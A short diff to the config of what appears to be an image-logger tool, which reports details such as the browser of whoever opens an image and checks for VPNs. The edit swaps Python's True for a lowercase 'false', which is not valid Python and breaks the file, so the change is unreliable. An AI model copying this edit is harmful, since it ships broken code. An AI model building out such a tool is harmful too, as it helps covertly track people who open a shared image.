@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "Your Browser Is {browser}", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": false, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
